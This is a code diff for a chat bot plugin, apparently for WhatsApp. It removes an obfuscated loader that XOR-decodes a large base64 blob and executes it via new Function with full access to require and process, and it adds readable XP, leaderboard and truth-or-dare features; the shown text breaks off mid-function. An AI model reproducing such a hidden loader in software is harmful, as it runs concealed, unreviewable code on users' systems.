@@ -1,9 +1,138 @@
 'use strict';
-(function(){
-  const K=Buffer.from('REVDQU5YTUQtMjAyNg==','base64');
-  const D='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';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+/**
+ * Community + fun + group helpers:
+ *   Chat levels: .rank [@user]  .top        (earn XP by chatting in groups)
+ *   Fun: .8ball  .ship  .truth  .dare  .choose  .rps
+ *   Groups: .rules  .setrules  .admins
+ *   Bot: .stats
+ */
+const U = require('../lib/util');
+const { UserError, bold } = U;
+
+const levelOf = xp => Math.floor(Math.sqrt(xp / 40));
+const xpFor = lvl => lvl * lvl * 40;
+const bar = (frac, n = 10) => '▰'.repeat(Math.round(frac * n)) + '▱'.repeat(n - Math.round(frac * n));
+const rnd = (a, b) => a + Math.floor(Math.random() * (b - a + 1));
+const hash = s => { let h = 7; for (const c of s) h = (h * 31 + c.charCodeAt(0)) >>> 0; return h; };
+const medal = i => ['🥇', '🥈', '🥉'][i] || `${i + 1}.`;
+
+const TRUTHS = ['What is the most embarrassing thing you have done in public?', 'Who was your first crush?', 'What is a secret talent nobody here knows about?', 'What is the last lie you told?', 'Which app do you waste the most time on?', 'What is the worst gift you have ever received?', 'Have you ever pretended to be sick to skip something?', 'What is your most unpopular opinion?', 'Which person in this chat would you swap lives with for a day?', 'What is something you are afraid to tell your parents?', 'What song do you secretly love but never admit?', 'What is the longest you have gone without showering?'];
+const DARES = ['Send a voice note singing the chorus of your favourite song.', 'Change your WhatsApp status to "I love broccoli" for one hour.', 'Send the 7th photo in your gallery (no cheating).', 'Type the next three messages using only emojis.', 'Send a voice note saying a tongue twister three times fast.', 'Compliment everyone in this chat, one by one.', 'Tell us a joke. If nobody laughs, do it again.', 'Send a selfie making your silliest face.', 'Speak only in questions for the next 10 minutes.', 'Send a voice note doing your best animal impression.'];
+const BALL = ['It is certain.', 'Without a doubt.', 'Yes, definitely.', 'Most likely.', 'Signs point to yes.', 'Ask again later.', 'Cannot predict now.', 'Better not tell you now.', 'Do not count on it.', 'My sources say no.', 'Very doubtful.', 'Outlook not so good.'];
+
+module.exports = ({ def, hooks }) => {
+  const P = ctx => ctx.var('PREFIX');
+
+  /* ---------------- chat levels ---------------- */
+  hooks.push({
+    name: 'xp', run: async ctx => {
+      if (!ctx.isGroup || ctx.fromMe || !ctx.fresh || !ctx.text || ctx.text.startsWith(ctx.var('PREFIX')) || !ctx.senderNum) return false;
+      const last = (ctx.rt.xpLast ||= new Map());
+      const k = `${ctx.chat}|${ctx.senderNum}`;
+      if (Date.now() - (last.get(k) || 0) < 30000) return false; // one XP gain per 30s per person
+      last.set(k, Date.now());
+      if (last.size > 5000) last.delete(last.keys().next().value);
+      ctx.update('xp', {}, o => {
+        const c = (o[ctx.chat] ||= {});
+        const u = (c[ctx.senderNum] ||= { xp: 0, msgs: 0, name: '' });
+        u.xp += rnd(8, 15); u.msgs++; if (ctx.name) u.name = ctx.name;
+        const keys = Object.keys(c);
+        if (keys.length > 600) { const low = keys.sort((a, b) => c[a].xp - c[b].xp)[0]; delete c[low]; }
+      });
+      return false;
+    }
+  });
+
+  const board = ctx => Object.entries(ctx.get('xp', {})[ctx.chat] || {}).map(([id, u]) => ({ id, ...u })).sort((a, b) => b.xp - a.xp);
+
+  def(['rank', 'level', 'xp'], { cat: 'community', usage: 'rank [@user]', desc: 'Your chat level and XP in this group. You earn XP by chatting.' }, async ctx => {
